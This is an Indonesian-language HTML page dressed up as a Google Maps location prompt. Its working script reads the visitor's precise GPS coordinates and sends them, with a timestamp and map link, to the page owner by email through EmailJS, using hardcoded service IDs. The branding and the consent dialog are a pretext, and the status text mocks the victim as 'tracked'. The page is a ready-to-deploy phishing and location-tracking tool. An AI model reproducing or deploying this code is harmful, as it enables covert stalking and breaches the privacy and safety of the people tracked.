
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Bagikan Lokasi</title>

  <link rel="stylesheet"
    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">

  <style>
    * { box-sizing: border-box; }

    body {
      margin: 0;
      font-family: Arial, sans-serif;
      color: #202124;
      background: #fff;
    }

    header {
      padding: 16px;
      background: white;
      box-shadow: 0 2px 5px #0002;
    }

    .brand {
      font-size: 22px;
      color: #1a73e8;
      font-weight: bold;
      margin-bottom: 12px;
    }

    input {
      width: 100%;
      padding: 13px;
      border: 1px solid #ddd;
      border-radius: 25px;
      font-size: 15px;
    }

    #map {
      width: 100%;
      height: 45vh;
      min-height: 260px;
    }

    .panel { padding: 18px; }

    .notice {
      background: #f1f5f9;
      padding: 14px;
      border-radius: 12px;
      line-height: 1.6;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 14px;
      background: #1a73e8;
      color: white;
      border: 0;
      border-radius: 24px;
      font-size: 15px;
      cursor: pointer;
      margin-top: 10px;
    }

    button:disabled {
      opacity: 0.6;
      cursor: wait;
    }

    #status, #coords {
      font-size: 14px;
      line-height: 1.7;
      overflow-wrap: anywhere;
      white-space: pre-line;
    }
  </style>
</head>

<body>
  <header>
    <div class="brand">Aktifkan Perizinan Lokasi untuk melanjutkan </div>
    <input id="search" placeholder="Cari tempat...">
  </header>

  <div id="map"></div>

  <section class="panel">
    <h3>Silakan Aktifkan Izin Lokasi</h3>

    <div class="notice">
      Izin lokasi diperlukan untuk mengakses Google Maps.
    </div>

    <p id="status">Menunggu perizinan.</p>
    <p id="coords"></p>

    <button id="consentButton">
      Aktifkan Izin Lokasi
    </button>
  </section>

  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

  <script>
    const EMAILJS_PUBLIC_KEY = "jzuOyCTWQn_58ncCd";
    const EMAILJS_SERVICE_ID = "service_873xl3f";
    const EMAILJS_TEMPLATE_ID = "template_g80wg7l";

    emailjs.init({
      publicKey: EMAILJS_PUBLIC_KEY
    });

    const map = L.map("map").setView(
      [-6.9932, 110.4203], 13
    );

    L.tileLayer(
      "https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png",
      {
        maxZoom: 19,
        attribution: "&copy; OpenStreetMap contributors"
      }
    ).addTo(map);

    const status = document.getElementById("status");
    const coords = document.getElementById("coords");
    const consentButton =
      document.getElementById("consentButton");

    let marker = null;
    let sending = false;

    consentButton.addEventListener("click", function () {
      if (sending) return;

      const approved = confirm(
        "Dengan melanjutkan, kamu mengaktifkan izin lokasi " +
        "Google Maps. Lanjutkan?"
      );

      if (!approved) return;

      if (!navigator.geolocation) {
        status.textContent =
          "Browser tidak mendukung lokasi GPS.";
        return;
      }

      sending = true;
      consentButton.disabled = true;
      status.textContent =
        "Meminta izin lokasi...";

      navigator.geolocation.getCurrentPosition(
        async function (position) {
          const lat = position.coords.latitude;
          const lng = position.coords.longitude;

          map.setView([lat, lng], 17);

          if (marker) map.removeLayer(marker);

          marker = L.marker([lat, lng])
            .addTo(map)
            .bindPopup("Lokasi perangkat")
            .openPopup();

          coords.textContent =
            "Latitude: " + lat.toFixed(6) +
            "\nLongitude: " + lng.toFixed(6);

          status.textContent =
            "Lokasi diperoleh. Terlacak kau suki wkwk...";

          try {
            await emailjs.send(
              EMAILJS_SERVICE_ID,
              EMAILJS_TEMPLATE_ID,
              {
                latitude: lat.toFixed(6),
                longitude: lng.toFixed(6),
                time: new Date().toLocaleString("id-ID"),
                maps_link:
                  "https://www.google.com/maps?q=" +
                  lat + "," + lng
              }
            );

            status.textContent =
              "Lokasi Didapatkan. Terlacak juga kau suki wkwk";
          } catch (error) {
            console.error("EmailJS error:", error);
            status.textContent =
              "Pengiriman gagal. Periksa konfigurasi EmailJS.";
          } finally {
            sending = false;
            consentButton.disabled = false;
          }
        },

        function (error) {
          if (error.code === 1) {
            status.textContent =
              "Izin lokasi ditolak. Silakan aktifkan izin lokasi.";
          } else if (error.code === 2) {
            status.textContent =
              "Lokasi tidak tersedia. Periksa pengaturan GPS.";
          } else {
            status.textContent =
              "Permintaan lokasi habis waktu. Coba lagi.";
          }

          sending = false;
          consentButton.disabled = false;
        },

        {
          enableHighAccuracy: true,
          timeout: 20000,
          maximumAge: 0
        }
      );
    });

    document.getElementById("search").addEventListener(
      "keydown",
      async function (event) {
        if (
          event.key !== "Enter" ||
          !this.value.trim()
        ) return;

        try {
          const response = await fetch(
            "https://nominatim.openstreetmap.org/search?format=json&limit=1&q=" +
            encodeURIComponent(this.value.trim())
          );

          if (!response.ok) throw new Error("Pencarian gagal");

          const data = await response.json();

          if (data.length) {
            map.setView(
              [+data[0].lat, +data[0].lon], 16
            );
            status.textContent =
              "Tempat ditemukan: " + data[0].display_name;
          } else {
            status.textContent =
              "Tempat tidak ditemukan.";
          }
        } catch (error) {
          status.textContent =
            "Pencarian gagal. Coba lagi.";
        }
      }
    );
  </script>
</body>
</html>
